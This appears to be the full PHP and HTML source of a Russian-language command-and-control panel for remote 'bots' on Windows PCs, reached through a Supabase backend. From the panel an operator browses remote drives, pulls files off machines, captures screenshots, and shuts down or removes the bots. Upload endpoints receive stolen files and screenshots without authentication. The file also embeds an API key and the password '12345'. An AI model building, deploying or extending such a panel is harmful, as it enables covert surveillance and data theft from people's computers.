<?php
ob_start(); 
session_start();
error_reporting(E_ALL); ini_set('display_errors', 1);

// НАСТРОЙКИ SUPABASE
define('SUPABASE_URL', 'https://bvskbsonxlntkpgywnoh.supabase.co/rest/v1');
define('SUPABASE_KEY', 'sb_publishable_di1Z96CWhijr9DtO69YMYQ_AJmpg33y');

// ПАРОЛЬ ОТ ПАНЕЛИ
define('PANEL_PASSWORD', '12345'); 

$cache_dir = __DIR__ . '/explorer_cache/';
if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);

// ФУНКЦИЯ ДЛЯ ЗАПРОСОВ К SUPABASE
function supabaseRequest($endpoint, $method = 'GET', $data = null, $extraHeaders = []) {
    $ch = curl_init(SUPABASE_URL . $endpoint);
    $headers = [
        "apikey: " . SUPABASE_KEY,
        "Authorization: Bearer " . SUPABASE_KEY,
        "Content-Type: application/json",
        "Prefer: return=representation"
    ];
    $headers = array_merge($headers, $extraHeaders);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    if ($data !== null) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true) ?: [];
}

// ОБРАБОТКА ВХОДА ПО ПАРОЛЮ
$login_error = "";
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === PANEL_PASSWORD) {
        $_SESSION['auth'] = true;
        $_SESSION['expire'] = time() + (30 * 60);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Неверный пароль!";
    }
}

// ПРОВЕРКА АВТОРИЗАЦИИ (30 минут)
$is_authenticated = false;
if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
    if (isset($_SESSION['expire']) && time() > $_SESSION['expire']) {
        session_unset(); session_destroy(); session_start();
    } else {
        $_SESSION['expire'] = time() + (30 * 60);
        $is_authenticated = true;
    }
}

if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html lang="ru">
    <head>
    <meta charset="UTF-8">
    <title>Вход — Панель Управления</title>
    <style>
        body { margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; display:flex; justify-content:center; align-items:center; height:100vh; }
        .login-card { background:#111827; border:1px solid #1f2937; border-radius:14px; padding:30px; width:320px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); text-align:center; }
        .login-card h2 { margin-top:0; font-size:20px; color:#f8fafc; }
        .login-card input { width:100%; padding:12px; margin:15px 0; background:#030712; border:1px solid #374151; border-radius:8px; color:white; box-sizing:border-box; font-size:14px; text-align:center; }
        .login-card button { width:100%; padding:12px; background:#4f46e5; color:white; border:none; border-radius:8px; font-weight:600; cursor:pointer; font-size:14px; transition:0.2s; }
        .login-card button:hover { background:#4338ca; }
        .error { color:#ef4444; font-size:13px; margin-bottom:10px; }
    </style>
    </head>
    <body>
        <div class="login-card">
            <h2>🔒 Авторизация</h2>
            <?php if(!empty($login_error)) echo "<div class='error'>$login_error</div>"; ?>
            <form method="POST">
                <input type="password" name="login_password" placeholder="Пароль" required autofocus>
                <button type="submit">Войти в систему</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// AJAX ОБНОВЛЕНИЕ ДАННЫХ
if (isset($_GET['api_refresh_all'])) {
    header('Content-Type: application/json');
    
    $devices_raw = supabaseRequest('/devices?select=*');
    $explorer_data = [];
    
    if (is_array($devices_raw)) {
        foreach($devices_raw as $d) {
            $id = $d['device_id'] ?? '';
            if(empty($id)) continue;
            
            $tree_file = $cache_dir . $id . '_tree.txt';
            $path_file = $cache_dir . $id . '_path.txt';
            $last_file_ptr = $cache_dir . $id . '_lastfile.txt';
            $screen_file = __DIR__ . '/screenshots/screen_' . $id . '.jpg';
            
            $time_raw = $d["time"] ?? ""; 
            $last = 0;
            $formatted_last_seen = "Никогда";

            if (!empty($time_raw)) {
                $time_clean = str_replace('T', ' ', $time_raw);
                $time_clean = preg_replace('/\.\d+Z?/', '', $time_clean);
                $last = @strtotime($time_clean);
                if ($last > 0) {
                    $formatted_last_seen = date('d.m.Y H:i:s', $last);
                }
            }

            // ПК считает в сети, если отправлял сигнал в течение последних 40 секунд
            $isOnline = ((time() - $last) <= 40 && $last > 0);

            $explorer_data[$id] = [
                "name" => $d["name"] ?? "Неизвестный ПК",
                "is_online" => $isOnline,
                "last_seen" => $formatted_last_seen,
                "current_path" => file_exists($path_file) ? file_get_contents($path_file) : 'C:\\',
                "last_file" => file_exists($last_file_ptr) ? file_get_contents($last_file_ptr) : '',
                "items" => file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [],
                "has_screenshot" => file_exists($screen_file),
                "screenshot_time" => file_exists($screen_file) ? filemtime($screen_file) : 0
            ];
        }
    }
    
    $logs = supabaseRequest('/commands?select=*&order=id.desc');
    
    echo json_encode([
        "devices" => $explorer_data,
        "logs" => is_array($logs) ? $logs : []
    ]);
    exit;
}

// ПРИЕМ ФАЙЛОВ И СКРИНШОТОВ ОТ БОТА
if (isset($_POST['screenshot_device_id'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
    
    if (isset($_POST['folder_structure'])) {
        file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
        file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
        echo "SERVER_SAVED_STRUCTURE"; exit;
    }
    if (isset($_FILES['downloaded_file'])) {
        $upload_dir = __DIR__ . '/downloads/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        $filename = basename($_FILES['downloaded_file']['name']);
        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $upload_dir . $dev_id . '_' . $filename)) {
            file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
            echo "SERVER_SAVED_FILE";
        }
        exit;
    }
    if (isset($_FILES['screenshot_file'])) {
        $upload_dir = __DIR__ . '/screenshots/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        move_uploaded_file($_FILES['screenshot_file']['tmp_name'], $upload_dir . 'screen_' . $dev_id . '.jpg');
        echo "SERVER_SAVED_SCREENSHOT"; exit;
    }
}

// СКАЧИВАНИЕ ФАЙЛОВ
if (isset($_GET['get_file']) && isset($_GET['dev'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
    $file = __DIR__ . '/downloads/' . $dev_id . '_' . basename($_GET['get_file']);
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($_GET['get_file']) . '"');
        readfile($file);
    } else { echo "Файл не найден."; }
    exit;
}
if (isset($_GET['download_screen'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['download_screen']);
    $file = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
    if (file_exists($file)) { header('Content-Type: image/jpeg'); readfile($file); } else { echo "Скриншот не найден."; }
    exit;
}

// ОБРАБОТЧИК КНОПОК ПАНЕЛИ
if ($_SERVER["REQUEST_METHOD"] === "POST" && !isset($_POST['login_password'])) {
    $action = $_POST["action"] ?? ""; 
    $device_id = $_POST["device_id"] ?? ""; 
    $target_path = $_POST["target_path"] ?? "";
    
    if (!empty($action)) {
        if ($action === "clear_commands") {
            supabaseRequest('/commands?id=gt.0', 'DELETE', null, ["Prefer: return=minimal"]);
        } else {
            if (($action === "get_files" || $action === "download_file") && !empty($target_path)) {
                $action = $action . "::" . $target_path;
            }
            supabaseRequest('/commands', 'POST', [
                "device_id" => $device_id,
                "action" => $action,
                "log" => "Ожидание..."
            ]);
        }
    }
    if(isset($_POST['js_async'])) { echo "OK"; exit; }
    header("Location: " . $_SERVER['PHP_SELF']); exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Панель Управления [SUPABASE REALTIME]</title>
<style>
body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
.header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
.sync-indicator{ font-size:12px; color:#34d399; font-weight: bold;}
.dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1s infinite; }
@keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:20px; }
.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; transition: 0.3s;}
.online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
.offline-card { border-color: #1f2937; opacity: 0.85; }
.name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
.status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
.online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
.row{ margin-top:8px; font-size:13px; color:#94a3b8; word-break: break-all;}
button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
.blue { background:#4f46e5; color:white; } .blue:hover{ background:#4338ca; }
.green { background:#059669; color:white; } .green:hover{ background:#047857; }
.orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
.red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
.gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
.explorer-box { background:#030712; border:1px solid #1f2937; border-radius:8px; padding:10px; margin-top:10px; max-height:280px; overflow-y:auto; }
.exp-item { display:flex; justify-content:space-between; align-items:center; padding:6px; border-bottom:1px solid #1f2937; font-size:12px; }
.exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
.exp-btn:hover { text-decoration:underline; color:#93c5fd; }
.log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; overflow-x:auto;}
table{ width:100%; border-collapse:collapse; font-size:13px;}
th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
th { color: #64748b; font-size: 11px; text-transform: uppercase;}
</style>
</head>
<body>

<div class="header">
    <span>🖥 Панель Управления [SUPABASE]</span>
    <div class="sync-indicator"><span class="dot"></span>Мгновенная синхронизация</div>
</div>

<div class="container" id="devices_container">
    <div style="color:#4b5563; grid-column: 1/-1; text-align:center; padding:40px;">Загрузка списка устройств...</div>
</div>

<div class="log-section">
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
        <div class="name" style="font-size:15px; margin:0;">📋 Системные отчеты выполнения (Live)</div>
        <button type="button" class="gray-danger" style="width: auto; padding: 6px 12px; margin: 0; font-size: 11px;" onclick="if(confirm('Очистить всю историю команд?')) sendCmdAsync('', 'clear_commands')">🧹 Очистить историю команд</button>
    </div>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Устройство</th>
                <th>Команда</th>
                <th>Статус / Результат</th>
            </tr>
        </thead>
        <tbody id="live_logs_body">
            <tr><td colspan="4" style="color:#4b5563; text-align:center;">Загрузка...</td></tr>
        </tbody>
    </table>
</div>

<script>
function sendCmdAsync(deviceId, action, targetPath = '') {
    let formData = new FormData();
    formData.append('action', action);
    formData.append('device_id', deviceId);
    formData.append('target_path', targetPath);
    formData.append('js_async', '1');
    fetch(window.location.href, { method: 'POST', body: formData }).catch(err => console.error("Ошибка отправки:", err));
}

function startRealtimeMonitor() {
    setInterval(() => {
        fetch('?api_refresh_all=1')
        .then(res => res.json())
        .then(data => {
            let container = document.getElementById('devices_container');
            let hasDevices = Object.keys(data.devices).length > 0;
            
            if (!hasDevices) {
                container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет зафиксированных ПК в базе</div>`;
            } else {
                let containerHtml = '';
                for (let id in data.devices) {
                    let pc = data.devices[id];
                    let cardClass = pc.is_online ? 'card online-card' : 'card offline-card';
                    let statusClass = pc.is_online ? 'status online' : 'status offline';
                    let statusText = pc.is_online ? 'В сети' : 'Не в сети';
                    
                    let explorerHtml = '';
                    if (pc.current_path !== 'C:\\' && pc.current_path !== 'C:/' && pc.current_path !== '') {
                        let parts = pc.current_path.split(/[\\\/]/); parts.pop(); if(parts.length <= 1) parts = ['C:'];
                        let parentPath = parts.join('\\\\'); if(!parentPath.endsWith('\\')) parentPath += '\\\\';
                        explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#f59e0b;" onclick="sendCmdAsync('${id}', 'get_files', '${parentPath}')">📁 .. [Назад]</button></div>`;
                    }

                    if (!pc.items || pc.items.length === 0) {
                        explorerHtml += `<span style='font-size:11px; color:#4b5563;'>Нажмите Обновить / Корень</span>`;
                    } else {
                        pc.items.forEach(item => {
                            let safePath = item.path.replace(/\\/g, '\\\\');
                            if (item.is_dir) {
                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button></div>`;
                            } else {
                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Скачать?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
                            }
                        });
                    }

                    let downloadBtnHtml = pc.last_file ? `<a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px;">💾 Скачать: ${pc.last_file}</a>` : '';
                    let screenshotBtnHtml = pc.has_screenshot ? `<a href="?download_screen=${id}&v=${pc.screenshot_time}" class="btn-link green" target="_blank" style="margin-bottom:6px; background:#4f46e5;">📥 Посмотреть скриншот</a>` : '';

                    containerHtml += `
                    <div class="${cardClass}">
                        <div style="display:flex; justify-space-between; align-items:center;">
                            <div class="name">${pc.name}</div>
                            <div class="${statusClass}">${statusText}</div>
                        </div>
                        <div class="row"><b>ID:</b> <span style="font-family:monospace;">${id}</span></div>
                        <div class="row"><b>Был в сети:</b> <span style="color:${pc.is_online ? '#34d399' : '#9ca3af'};">${pc.last_seen}</span></div>
                        
                        <hr style="border-color:#1f2937; margin:12px 0;">
                        <div class="name" style="font-size:14px;">📂 Проводник:</div>
                        <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">${pc.current_path}</span>
                        <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('${id}', 'get_files', 'C:\\\\')">🔄 Корень диска C:</button>
                        <div class="explorer-box">${explorerHtml}</div>
                        <div>${downloadBtnHtml}</div>
                        <hr style="border-color:#1f2937; margin:15px 0;">
                        <button type="button" class="blue" onclick="sendCmdAsync('${id}', 'take_screenshot')">📸 Скриншот</button>
                        <div>${screenshotBtnHtml}</div>
                        <hr style="border-color:#1f2937; margin:15px 0;">
                        <button type="button" class="orange" onclick="if(confirm('Закрыть бота?')) sendCmdAsync('${id}', 'stop_client')">❌ Закрыть бота</button>
                        <button type="button" class="red" onclick="if(confirm('Выключить ПК?')) sendCmdAsync('${id}', 'shutdown')">💻 Выключить ПК</button>
                        <button type="button" class="gray-danger" onclick="if(confirm('Удалить ПК?')) sendCmdAsync('${id}', 'delete')">🗑 Удалить</button>
                    </div>`;
                }
                if (container.dataset.lastHtml !== containerHtml) {
                    container.innerHTML = containerHtml;
                    container.dataset.lastHtml = containerHtml;
                }
            }

            let logsBody = document.getElementById('live_logs_body');
            if (logsBody && data.logs) {
                let logsHtml = '';
                if(data.logs.length === 0) {
                    logsHtml = `<tr><td colspan="4" style="color:#4b5563; text-align:center;">Отчетов нет</td></tr>`;
                } else {
                    data.logs.forEach(l => {
                        logsHtml += `<tr>
                            <td style="font-family:monospace; color:#64748b;">${l.id}</td>
                            <td style="font-family:monospace;">${l.device_id}</td>
                            <td style="color:#60a5fa;">${l.action}</td>
                            <td style="font-weight:600; color:#10b981;">${l.log || ''}</td>
                        </tr>`;
                    });
                }
                logsBody.innerHTML = logsHtml;
            }
        })
        .catch(err => console.error("Ошибка получения данных:", err));
    }, 1500);
}

window.onload = startRealtimeMonitor;
</script>
</body>
</html>
